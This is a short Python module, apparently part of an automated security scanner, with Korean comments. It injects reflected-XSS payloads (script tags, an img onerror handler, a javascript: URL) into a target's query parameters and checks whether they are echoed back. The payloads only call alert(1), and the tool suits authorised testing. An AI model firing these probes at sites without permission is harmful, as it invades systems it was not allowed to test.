"""Reflected XSS 익스플로잇 executor."""
import logging
from typing import TypedDict

import httpx

logger = logging.getLogger(__name__)

_XSS_PAYLOADS: tuple[str, ...] = (
    "<script>alert(1)</script>",
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
)

_TIMEOUT_SECONDS = 30


class ExploitOutcome(TypedDict):
    success: bool
    payload: str
    response_snippet: str
    evidence: str
    error: str | None


async def execute(target_url: str, endpoint: str, params: dict) -> ExploitOutcome:
    """반사형 XSS 페이로드를 URL 쿼리스트링에 주입하고 응답에 그대로 반영되는지 확인한다.

    Content-Type이 text/html인 응답에서만 반사를 확인한다.
    서버가 HTML을 인코딩하면 탐지되지 않으므로 raw 반사 여부만 판단한다.
    """
    url = target_url.rstrip("/") + "/" + endpoint.lstrip("/")
    last_error: str | None = None

    async with httpx.AsyncClient(timeout=_TIMEOUT_SECONDS, follow_redirects=True) as client:
        for payload in _XSS_PAYLOADS:
            # 각 파라미터 키에 페이로드를 주입한다
            injected_params = {k: payload for k in params} if params else {"q": payload}
            try:
                response = await client.get(url, params=injected_params)
                snippet = response.text[:500]

                if payload in response.text:
                    return ExploitOutcome(
                        success=True,
                        payload=payload,
                        response_snippet=snippet,
                        evidence="Payload reflected verbatim in response body",
                        error=None,
                    )

            except httpx.HTTPError as exc:
                last_error = str(exc)
                logger.warning("[xss] request failed endpoint=%s: %s", endpoint, exc)

    return ExploitOutcome(
        success=False,
        payload=",".join(_XSS_PAYLOADS),
        response_snippet="",
        evidence="No payload reflection detected",
        error=last_error,
    )
